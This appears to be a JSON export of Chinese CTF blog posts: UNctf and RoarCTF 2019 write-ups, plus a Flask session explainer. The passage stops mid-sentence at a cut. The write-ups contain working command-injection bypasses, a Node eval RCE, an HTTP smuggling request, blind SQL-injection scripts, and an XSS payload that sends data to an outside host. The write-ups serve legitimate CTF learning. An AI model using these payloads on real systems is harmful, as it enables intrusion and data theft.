{"total":50,"pageSize":8,"pageCount":7,"data":[{"title":"UNctf 赛后回顾","slug":"unctf","date":"2019-11-20T01:26:49.000Z","updated":"2019-12-01T12:59:49.886Z","comments":true,"path":"api/articles/unctf.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"UNctf-赛后回顾\"><a href=\"#UNctf-赛后回顾\" class=\"headerlink\" title=\"UNctf 赛后回顾\"></a>UNctf 赛后回顾</h1><h2 id=\"bypass\"><a href=\"#bypass\" class=\"headerlink\" title=\"bypass\"></a>bypass</h2><p>题目源码：</p>\n<pre><code>&lt;?php\n    highlight_file(__FILE__);\n    $a = $_GET[&apos;a&apos;];\n    $b = $_GET[&apos;b&apos;];\n // try bypass it\n    if (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))\n        $a = &quot;&quot;;\n        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    if (preg_match(&quot;/\\&apos;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))\n        $b = &quot;&quot;;\n        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;\n     $cmd = &quot;file $a $b&quot;;\n      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); \n     system($cmd);\n?&gt;</code></pre><h3 id=\"one-way\"><a href=\"#one-way\" class=\"headerlink\" title=\"one way\"></a>one way</h3><p>正则黑名单匹配，对输入的参数强制加上双引号，即使我们绕过检测也会被加上双引号无法执行命令。这里用到了反引号 ```</p>\n<p>观察第一个正则 `\\|`` 三个反斜杠才能转义反斜杠，这里对 | 进行了转义从而造成反引号逃逸。</p>\n<pre><code>&lt;?php\n$a = &quot;`dir`&quot;;\nif (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`/is&quot;,$a))\n    $a = &quot;&quot;;\n    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    var_dump($a);\n\nstring(7) &quot;&quot;`dir`&quot;&quot;</code></pre><p>可以看到反引号成功逃逸。</p>\n<p>我们到题目中尝试列目录，没有 <code>ls</code> 可以用 <code>dir</code></p>\n<pre><code>?a=`dir%20/`\n\n响应：\n\nbin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\\011mnt proc run\\011 srv\\011 sys\\011usr\\012boot etc lib\\011 media\\011opt root sbin start.sh tmp\\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>查找flag </p>\n<pre><code>?a=`/b??/gr??%20-R%20unctf`\n\n响应：\n.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id=\"another-way\"><a href=\"#another-way\" class=\"headerlink\" title=\"another way\"></a>another way</h2><p>第二个正则 <code>\\\\|\\n</code> 会解释为竖线和换行，所以利用 <code>%0a</code> 进行换行绕过，同时末尾使用 <code>%20#</code> 来终止命令处理双引号</p>\n<pre><code>?a=\\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23\n效果是\nfile&quot;\\&quot;&quot;\n/???/gr?p -R ctf #&quot;</code></pre><h2 id=\"easy-xss\"><a href=\"#easy-xss\" class=\"headerlink\" title=\"easy xss\"></a>easy xss</h2><p>在留言板处提交 xss 发现能够触发，访问储存的路径发现一个接口</p>\n<pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>此时的请求头里带上了 <code>XMLHttpRequest</code> ，同时不带参数访问时得到 debug 页面，可以看到 XHR请求带上了 cookie ，于是我们构造 XHR 请求</p>\n<pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=new\nXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;\nxmlhttp.responseText.match(&apos;flag\\\\{(.\\*?)\\\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\\&gt;</code></pre><h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>查看源码发现各个接口</p>\n<pre><code>      switch (e.cmd) {\n        case &apos;name&apos;:\n          this.nickname = e.msg,\n          this.kesshoubanMsg(`Change nickname ${this.nickname\n        }\n         success!`);\n        break;\n      case &apos;error&apos;:\n        this.kesshoubanMsg(`🙁${e.msg\n    }\n    `);\n    break;\n  case &apos;calc&apos;:\n    this.kesshoubanMsg(`${e.msg\n  }\n  `);\n  break;\ncase &apos;flag&apos;:\n  this.kesshoubanMsg(`${e.msg\n}\n`);</code></pre><p>修改完名字后测试 <code>/calc 1+1</code> 发现成功执行，存在代码注入参考<a href=\"http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/\" target=\"_blank\" rel=\"noopener\">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>\n<p>尝试 <code>/calc require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> 其中空格过滤绕过 $IFS ，同时Sync采用非阻塞返回。</p>\n","text":"UNctf 赛后回顾bypass题目源码：&lt;?php    highlight_file(__FILE__);    $a = $_GET[&apos;a&apos;];    $b = $_GET[&apos;b&apos;]; // try bypass it    i","link":"","raw":null,"photos":[],"categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"},{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"flask-session","slug":"flask-session","date":"2019-11-06T12:43:45.000Z","updated":"2019-11-06T13:12:13.785Z","comments":true,"path":"api/articles/flask-session.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"flask-session\"><a href=\"#flask-session\" class=\"headerlink\" title=\"flask-session\"></a>flask-session</h1><p>11/6/2019 8:43:45 PM </p>\n<p>搬运文章 <a href=\"https://cizixs.com/2017/03/08/flask-insight-session/\" target=\"_blank\" rel=\"noopener\">https://cizixs.com/2017/03/08/flask-insight-session/</a></p>\n<p><strong>session是如何使用的：</strong></p>\n<p>cookie和session结合使用：web开发发展至今，cookie和session的使用已经出现了一些非常成熟的方案。在如今的市场或者企业里，一般有两种存储方式：</p>\n<ul>\n<li><p>存储在服务端：通过cookie存储一个<code>session_id</code>，然后具体的数据则是保存在session中。如果用户已经登录，则服务器会在cookie中保存一个<code>session_id</code>，下次再次请求的时候，会把该<code>session_id</code>携带上来，服务器根据session_id在session库中获取用户的session数据。就能知道该用户到底是谁，以及之前保存的一些状态信息。这种专业术语叫做<code>server side session</code>。</p>\n</li>\n<li><p>将session数据加密，然后存储在cookie中。这种专业术语叫做<code>client side session</code>。flask采用的就是这种方式，但是也可以替换成其他形式。</p>\n</li>\n</ul>\n<p>在解析 session 的实现之前，我们先介绍一下 session 怎么使用。session 可以看做是在不同的请求之间保存数据的方法，因为 HTTP 是无状态的协议，但是在业务应用上我们希望知道不同请求是否是同一个人发起的。比如购物网站在用户点击进入购物车的时候，服务器需要知道是哪个用户执行了这个操作。</p>\n<p>在 flask 中使用 session 也很简单，只要使用 from flask import session 导入这个变量，在代码中就能直接通过读写它和 session 交互。</p>\n<pre><code>from flask import Flask, session, escape, request\n\napp = Flask(__name__)\napp.secret_key = &apos;please-generate-a-random-secret_key&apos;\n\n\n@app.route(&quot;/&quot;)\ndef index():\n    if &apos;username&apos; in session:\n        return &apos;hello, {}\\n&apos;.format(escape(session[&apos;username&apos;]))\n    return &apos;hello, stranger\\n&apos;\n\n\n@app.route(&quot;/login&quot;, methods=[&apos;POST&apos;])\ndef login():\n    session[&apos;username&apos;] = request.form[&apos;username&apos;]\n    return &apos;login success&apos;\n\n\nif __name__ == &apos;__main__&apos;:\n    app.run(host=&apos;0.0.0.0&apos;, port=5000, debug=True)</code></pre><p>上面这段代码模拟了一个非常简单的登陆逻辑，用户访问 <code>POST /login</code> 来登陆，后面访问页面的时候 <code>GET /</code>，会返回该用户的名字</p>\n<p>直接访问：</p>\n<pre><code>GET / HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nHost: 127.0.0.1:5000\nUser-Agent: HTTPie/0.8.0\n\n\nHTTP/1.0 200 OK\nContent-Length: 14\nContent-Type: text/html; charset=utf-8\nDate: Wed, 01 Mar 2017 04:22:18 GMT\nServer: Werkzeug/0.11.2 Python/2.7.10\n\nhello stranger</code></pre><p>用户名cizixs 模拟登录：</p>\n<pre><code>POST /login HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nContent-Length: 15\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nHost: 127.0.0.1:5000\nUser-Agent: HTTPie/0.8.0\n\nusername=cizixs\n\nHTTP/1.0 200 OK\nContent-Length: 13\nContent-Type: text/html; charset=utf-8\nDate: Wed, 01 Mar 2017 04:20:54 GMT\nServer: Werkzeug/0.11.2 Python/2.7.10\nSet-Cookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fdpg.fqm3FTv0kYE2TuOyGF1mx2RuYQ4; HttpOnly; Path=/\n\nlogin success</code></pre><p>最重要的是我们看到 response 中有 <code>Set-Cookie</code> 的头部，cookie 的键是 <code>session</code></p>\n<p>这次请求我们带上上次的 cookie 访问：</p>\n<pre><code>GET / HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nCookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fevg.LE03yEZDWTUMQW-nNkTr1zBEhKk\nHost: 127.0.0.1:5000\nUser-Agent: HTTPie/0.8.0\n\n\nHTTP/1.0 200 OK\nContent-Length: 11\nContent-Type: text/html; charset=utf-8\nDate: Wed, 01 Mar 2017 04:25:46 GMT\nServer: Werkzeug/0.11.2 Python/2.7.10\nSet-Cookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5feyg.sfFCDIqfef4i8cvxUClUUGQNcHA; HttpOnly; Path=/\n\nhellocizixs</code></pre><p>可以看到我们成功的不通过用户名登陆。</p>\n<p>总结一下：session 是通过在客户端设置 cookie 实现的，每次客户端发送请求的时候会附带着所有的 cookie，而里面保存着一些重要的信息（比如这里的用户信息），这样服务器端就能知道客户端的信息，然后根据这些数据做出对应的判断，就好像不同请求之间是有记忆的。</p>\n<p><strong>请求过程</strong></p>\n<ul>\n<li>请求过来的时候，flask 会根据 cookie 信息创建出 session 变量（如果 cookie 不存在，这个变量有可能为空），保存在该请求的上下文中</li>\n<li>视图函数可以获取 session 中的信息，实现自己的逻辑处理</li>\n<li>flask 会在发送 response 的时候，根据 session 的值，把它写回到 cookie 中</li>\n</ul>\n<p>注意：session 和 cookie 的转化过程中，应该考虑到安全性，不然直接使用伪造的 cookie 会是个很大的安全隐患。</p>\n<p><strong>加密session</strong></p>\n<p>搬运<a href=\"https://www.leavesongs.com/PENETRATION/client-session-security.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>\n<p>flask 处理 session 安全性问题时在代码中新建了 <code>URLSafeTimedSerializer</code> 类 ，用它的dumps方法将类型为字典的 <code>session</code> 对象序列化成字符串，然后用 <code>response.set_cookie</code> 将最后的内容保存在cookie中。 </p>\n<p><code>URLSafeTimedSerializer</code> 做了什么？主要经过几步</p>\n<ul>\n<li>json.dumps 将对象转换成json字符串，作为数据</li>\n<li>如果数据压缩后长度更短，则用zlib库进行压缩</li>\n<li>将数据用base64编码</li>\n<li>通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割</li>\n</ul>\n<p>第4步就解决了用户篡改session的问题，因为在不知道 <code>secret_key</code> 的情况下，是无法伪造签名的。注意到，在第4步中，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其 session 的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p>\n<p><strong>解密session</strong></p>\n<p>有时候在开发或者调试的过程中，需要了解 cookie 中保存的到底是什么值，可以通过手动解析它的值。session 在 cookie 中的值，是一个字符串，由句号分割成三个部分。第一部分是 base64 加密的数据，第二部分是时间戳，第三部分是校验信息。</p>\n<p>前面两部分的内容可以通过下面的方式获取，代码也可直观，就不给出解释了：</p>\n<pre><code>In [1]: from itsdangerous import *\n\nIn [2]: s = &apos;eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fdpg.fqm3FTv0kYE2TuOyGF1mx2RuYQ4&apos;\n\nIn [3]: data, timstamp, secret = s.split(&apos;.&apos;)\n\nIn [4]: base64_decode(data)\nOut[4]: &apos;{&quot;username&quot;:&quot;cizixs&quot;}&apos;\n\nIn [5]: bytes_to_int(base64_decode(timstamp))\nOut[5]: 194502054\n\nIn [7]: time.strftime(&apos;%Y-%m-%d %H:%I%S&apos;, time.localtime(194502054+EPOCH))\nOut[7]: &apos;2017-03-01 12:1254&apos;</code></pre><p><strong>session使用</strong></p>\n<p>上面看到 session 其实就像一个字典，我们使用的时候可以直接使用：</p>\n<pre><code>session[&apos;name&apos;] = name</code></pre>","text":"flask-session11/6/2019 8:43:45 PM 搬运文章 https://cizixs.com/2017/03/08/flask-insight-session/session是如何使用的：cookie和session结合使用：web开发发展至今，cookie","link":"","raw":null,"photos":[],"categories":[{"name":"web","slug":"web","count":1,"path":"api/categories/web.json"}],"tags":[{"name":"flask","slug":"flask","count":1,"path":"api/tags/flask.json"}]},{"title":"roarctf 2019","slug":"roarctf-2019","date":"2019-10-16T08:45:49.000Z","updated":"2019-11-06T13:13:29.498Z","comments":true,"path":"api/articles/roarctf-2019.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"roarctf-2019\"><a href=\"#roarctf-2019\" class=\"headerlink\" title=\"roarctf 2019\"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p>\n<h2 id=\"easy-java\"><a href=\"#easy-java\" class=\"headerlink\" title=\"easy_java\"></a>easy_java</h2><p>拿到题目看到文件下载的接口，尝试 <code>/Download?filename=help.docx</code> ,发现没法下载，尝试下载网页上的照片发现也下载不了，后来就跑偏了，在想会不会是 <code>SSTI</code> ?fuzz了半天也没找到思路.  🎨</p>\n<p>改变请求方式为 <code>post</code> 即可成功下载到 <code>help.docx</code> ,里边没有什么有用的信息。 </p>\n<p>随便下载一个不存在的文件，得到报错信息里有服务器版本信息。做的时候就被难到的地方就是文件下载不知道下载什么东西。记得上次碰到这种题的时候还是 <code>SUCTF</code> 读 <code>nginx</code> 配置文件</p>\n<h3 id=\"什么是-WEB-INF\"><a href=\"#什么是-WEB-INF\" class=\"headerlink\" title=\"什么是 WEB-INF\"></a>什么是 WEB-INF</h3><blockquote>\n<p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>\n</blockquote>\n<ol>\n<li><p>/WEB-INF/web.xml</p>\n<p> Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>\n</li>\n<li><p>/WEB-INF/classes/</p>\n<p> 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）。</p>\n</li>\n</ol>\n<p>其他的配置文件介绍看<a href=\"https://baike.baidu.com/item/web-inf\" title=\"这里\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/web-inf</a></p>\n<p>事实上就是在xml中配置好映射路径然后进行对某些含受保护内容文件的访问。</p>\n<p>我们访问 <code>WEB-INF/web.xml</code> 发现操作flag的关键配置</p>\n<p>按照映射关系访问 <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> 即可得到解密的字符串，base64解密即可</p>\n<h2 id=\"easy-calc\"><a href=\"#easy-calc\" class=\"headerlink\" title=\"easy_calc\"></a>easy_calc</h2><p>右键查看源码</p>\n<pre><code>&lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;num&apos;])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET[&apos;num&apos;];\n        $blacklist = [&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos;,&apos;\\$&apos;,&apos;\\\\&apos;,&apos;\\^&apos;];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {\n                        die(&quot;what are you want to do?&quot;);\n                }\n        }\n        eval(&apos;echo &apos;.$str.&apos;;&apos;);\n}\n?&gt; </code></pre><p>有waf，这里有两种方法绕过：</p>\n<ol>\n<li>利用字符串解析特性 Bypass</li>\n</ol>\n<p>原理看这篇文章：<br><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p>这里说一下大概意思<br> PHP 处理 GET or POST 请求时将查询字符串转换成数组 <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> 。参数名里的一些字符会被移除或替换成下划线 <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> 如果WAF规则是参数里含有一个非数值型的值时进行拦截时，我们就可以用下列语句绕过<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> 它会被存储在 <code>$_GET[&quot;news_id&quot;]</code> 。</p>\n<p>这是测试php是如何处理特殊字符：</p>\n<pre><code>&lt;?php\nforeach(\n    [\n        &quot;{chr}foo_bar&quot;,\n        &quot;foo{chr}bar&quot;,\n        &quot;foo_bar{chr}&quot;\n    ] as $k =&gt; $arg) {\n    for($i=0;$i&lt;=255;$i++) {\n        echo &quot;\\033[999D\\033[K\\r&quot;;\n        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;\n        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);\n        /* yes... I&apos;ve added a sleep time on each loop just for\n        the scenic effect :)\nlike that movie with unrealistic\n        brute-force where the password are obtained\n        one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ\n        */\n        usleep(5000);\n        if(isset($o[&quot;foo_bar&quot;])) {\n            echo &quot;\\033[999D\\033[K\\r&quot;;\n            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\\n&quot;;\n        }\n    }\n    echo &quot;\\033[999D\\033[K\\r&quot;;\n    echo &quot;\\n&quot;;\n}</code></pre><p>这道题目经过测试参数前加一个 <code>%20</code>或者 <code>+</code> 来绕过</p>\n<ol start=\"2\">\n<li>http协议走私攻击</li>\n</ol>\n<blockquote>\n<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>\n</blockquote>\n<p>这里我们通过 CL-CL 来Bypass</p>\n<pre><code>POST /calc.php?num=phpinfo() HTTP/1.1\nHost: ********\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: keep-alive\nReferer: **********\nCookie: __cfduid=***********\nX-Forwarded-For: 127.0.0.1\nContent-Length: 7\nContent-Length: 7\nContent-Type: application/x-www-form-urlencoded\n\nnum=111</code></pre><p>绕过waf之后还禁掉了一些字符不能直接读到 flag 。</p>\n<p>先学习几个函数</p>\n<ul>\n<li>ord — 返回字符的 ASCII 码值</li>\n<li>bin2hex — 函数把包含数据的二进制字符串转换为十六进制值</li>\n<li>hex2bin — 转换十六进制字符串为二进制字符串</li>\n<li>dechex — 十进制转换为十六进制</li>\n<li>base_convert — 在任意进制之间转换数字</li>\n<li>hexdec — 十六进制转换为十进制</li>\n</ul>\n<p>读取flag</p>\n<pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id=\"Online-Proxy\"><a href=\"#Online-Proxy\" class=\"headerlink\" title=\"Online Proxy\"></a>Online Proxy</h2><p>打开靶机，抓包发现响应头</p>\n<pre><code>&lt;!-- Debug Info: \n Duration: 0.058279037475586 s \n Current Ip: 127.0.0.1 </code></pre><p>在 XFF 处尝试修改内容，发现可以修改成功。<code>Current Ip</code> 处显示当前的 XFF值，<code>Last Ip</code> 显示上次查询内容。执行 sleep() 语句 <code>1&#39; and sleep(3) and 1=&#39;1</code> 发现在第二次进行修改发包之后成功执行，存在二次注入。</p>\n<p>所谓二次注入就是服务端在第一次接收脏数据时对数据进行了 <code>addslashes</code> 或 <code>mysql_escape_string</code>  处理，但是存入数据库时存的还是脏数据，于是在第二次查询时由于查询的是脏数据，信息仍然会泄露。</p>\n<p>查看源码：</p>\n<pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);\n$content = str_replace(&quot;&lt;a href=\\&quot;&quot;, &quot;&lt;a href=\\&quot;/?url=&quot;, $content);\n$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);\necho($content);\n$end = microtime(true);\n$time = $end - $start;\n$last_ip = &quot;&quot;;\n$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\nif(count($result) &gt; 0) {\n    if($ip !== $result[0][&apos;current_ip&apos;]) {\n        $last_ip = $result[0][&apos;current_ip&apos;];\n        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\n    } else {\n        $last_ip = $result[0][&apos;last_ip&apos;];\n    }\n}\nquery(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);\ndie(&quot;\\n&lt;!-- Debug Info: \\n Duration: $time s \\n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>可以看到在查询到数据之后，如果 <code>$ip !== $result[0][&#39;current_ip&#39;]</code> 那么 <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ，随后将 last_ip 不带过滤的带入数据库中查询。</p>\n<p>所以我们注入的思路就是先将 exp 插入数据，然后再正常访问一次将数据带出。</p>\n<p>exp:</p>\n<pre><code>import requests\nfrom time import sleep\nurl = &quot;http://node3.buuoj.cn:28063/&quot;\ns = requests.session()\n\nre = s.get(url)\nname = &apos;&apos;\n&quot;&quot;&quot;\n# database name\n# current db : ctf\n# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# table name\n# ctf : ip_log\n# F4l9_D4t4B45e : F4l9_t4b1e\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# column_name\n# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMn\nfor i in range(1,20):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break</code></pre><p>这个太不优雅了，赵师傅的更优雅：</p>\n<pre><code>#!/usr/bin/env python3\n\nimport requests\n\ntarget = &quot;http://localhost:8302/&quot;\n\ndef execute_sql(sql):\n    print(&quot;[*]请求语句：&quot; + sql)\n    return_result = &quot;&quot;\n\n    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;\n    session = requests.session()\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    start_pos = r.text.find(&quot;Last Ip: &quot;)\n    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n    length = int(r.text[start_pos + 9: end_pos])\n    print(&quot;[+]长度：&quot; + str(length))\n\n    for i in range(1, length + 1, 5):\n        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;\n\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        start_pos = r.text.find(&quot;Last Ip: &quot;)\n        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n        result = int(r.text[start_pos + 9: end_pos])\n        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)\n\n        print(&quot;[+]位置 &quot; + str(i) + &quot; 请求五位成功:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))\n\n    return return_result\n\n\n# 获取数据库\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))\n\n# 获取数据库表\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))\n\n# 获取数据库表\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))\n\n# 获取表中内容\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>这里用的是 <code>1&#39;|&#39;1&#39;|&#39;1</code> 